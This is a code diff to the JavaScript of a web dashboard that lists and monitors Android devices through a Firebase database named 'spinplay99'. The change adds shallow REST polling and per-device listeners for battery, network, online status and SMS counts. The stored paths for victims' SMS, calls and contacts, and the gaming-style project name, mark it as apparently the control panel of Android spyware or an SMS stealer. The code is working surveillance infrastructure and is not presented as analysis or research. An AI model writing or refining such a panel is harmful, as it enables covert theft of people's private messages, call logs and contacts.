@@ -440,29 +440,87 @@ var DB, allDevs=[], selDev='', activeListeners={};
 function setStatus(t,m){var p=document.getElementById('statusPill');p.className='status-pill'+(t==='connected'?' connected':'');document.getElementById('statusText').textContent=m;}
 
 // ═══ DEVICE LISTENER ═══
+// Per-device meta storage (lightweight only)
+var devMeta = {};
+var devListeners = {};
+
 function startDeviceListener(){
-  DB.ref('devices').on('value',function(snap){
-    var raw=snap.val(); allDevs=[];
-    if(!raw){renderSidebar();updateStats();return;}
-    var now=Date.now();
-    Object.keys(raw).forEach(function(k){
-      var d=raw[k],info=d.device_info||{},live=d.live_data||{};
-      // Online if online_status is true OR timestamp updated within 5 min
-      var ts=live.timestamp_millis||0;
-      var tsAge=(ts>0 && now>ts)?(now-ts):0;
-      var on=(d.online_status===true)||(d.online_status==1)||(tsAge>0&&tsAge<300000);
-      allDevs.push({id:k,name:info.device_model||'Unknown',brand:info.device_brand||'',android:info.android_version||'',
-        status:on?'online':'offline',battery:live.battery_level||0,network:live.network_type||'?',
-        charging:live.is_charging||false,lastSeen:live.timestamp_millis||info.last_seen||0,
-        smsCount:d.all_sms?d.all_sms.total_count||0:0});
-    });
-    allDevs.sort(function(a,b){return a.status==='online'&&b.status!=='online'?-1:a.status!=='online'&&b.status==='online'?1:b.lastSeen-a.lastSeen;});
-    if(!selDev&&allDevs.length>0) selDev=allDevs[0].id;
-    if(selDev&&!allDevs.find(function(d){return d.id===selDev;})) selDev=allDevs.length>0?allDevs[0].id:'';
-    document.getElementById('mainLayout').style.display='flex';
-    renderSidebar(); updateStats();
-    if(selDev) openDevice(selDev);
+  var REST = "https://spinplay99-default-rtdb.asia-southeast1.firebasedatabase.app";
+
+  // Step 1: Get device IDs only via REST shallow query (no heavy data downloaded)
+  function fetchDeviceIds(){
+    fetch(REST + '/devices.json?shallow=true')
+      .then(function(r){ return r.json(); })
+      .then(function(ids){
+        if(!ids){ renderSidebar(); updateStats(); return; }
+        Object.keys(ids).forEach(function(id){
+          if(!devListeners[id]) attachDeviceListeners(id);
+        });
+      })
+      .catch(function(){ setTimeout(fetchDeviceIds, 5000); });
+  }
+  fetchDeviceIds();
+  // Refresh device list every 30s to catch new devices
+  setInterval(fetchDeviceIds, 30000);
+}
+
+// Step 2: Per-device lightweight listeners (only meta paths, NOT sms/calls/contacts)
+function attachDeviceListeners(id){
+  devListeners[id] = true;
+  if(!devMeta[id]) devMeta[id] = {id:id,name:'Loading...',brand:'',android:'',status:'offline',battery:0,network:'?',charging:false,lastSeen:0,smsCount:0};
+
+  // online_status
+  DB.ref('devices/'+id+'/online_status').on('value', function(s){
+    devMeta[id].online_status = s.val();
+    refreshDevList();
   });
+  // live_data (battery, network, timestamp, sms count)
+  DB.ref('devices/'+id+'/live_data').on('value', function(s){
+    var live = s.val()||{};
+    var now = Date.now();
+    var ts = live.timestamp_millis||0;
+    var tsAge = (ts>0 && now>ts)?(now-ts):0;
+    devMeta[id].battery   = live.battery_level||0;
+    devMeta[id].network   = live.network_type||'?';
+    devMeta[id].charging  = live.is_charging||false;
+    devMeta[id].lastSeen  = ts||0;
+    devMeta[id].liveTs    = ts;
+    devMeta[id].liveTsAge = tsAge;
+    refreshDevList();
+  });
+  // device_info (model, brand, android)
+  DB.ref('devices/'+id+'/device_info').on('value', function(s){
+    var info = s.val()||{};
+    devMeta[id].name    = info.device_model||'Unknown';
+    devMeta[id].brand   = info.device_brand||'';
+    devMeta[id].android = info.android_version||'';
+    // get sms total_count from all_sms (lightweight: only total_count field)
+    DB.ref('devices/'+id+'/all_sms/total_count').once('value', function(sc){
+      devMeta[id].smsCount = sc.val()||0;
+      refreshDevList();
+    });
+    refreshDevList();
+  });
+}
+
+function refreshDevList(){
+  var now = Date.now();
+  allDevs = Object.values(devMeta).map(function(m){
+    var ts = m.liveTs||0;
+    var tsAge = (ts>0 && now>ts)?(now-ts):0;
+    var on = (m.online_status===true)||(m.online_status==1)||(tsAge>0&&tsAge<300000);
+    return Object.assign({}, m, {status: on?'online':'offline'});
+  });
+  allDevs.sort(function(a,b){
+    return a.status==='online'&&b.status!=='online'?-1:
+           a.status!=='online'&&b.status==='online'?1:
+           b.lastSeen-a.lastSeen;
+  });
+  if(!selDev&&allDevs.length>0) selDev=allDevs[0].id;
+  if(selDev&&!allDevs.find(function(d){return d.id===selDev;}))
+    selDev=allDevs.length>0?allDevs[0].id:'';
+  document.getElementById('mainLayout').style.display='flex';
+  renderSidebar(); updateStats();
 }
 
 // ═══ SIDEBAR ═══
